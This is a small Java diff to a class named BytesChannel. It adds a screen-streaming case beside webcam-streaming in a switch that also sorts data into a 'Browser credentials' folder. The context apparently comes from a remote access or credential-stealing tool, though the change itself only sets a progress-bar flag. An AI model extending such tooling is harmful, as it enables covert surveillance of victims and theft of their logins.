@@ -47,6 +47,8 @@ public class BytesChannel {
                 categoryOutputFolder = "Browser credentials";
             } case WEBCAM_STREAMING -> {
                 updateProgressBar = false;
+            } case SCREEN_STREAMING -> {
+                updateProgressBar = false;
             }
         }
     }
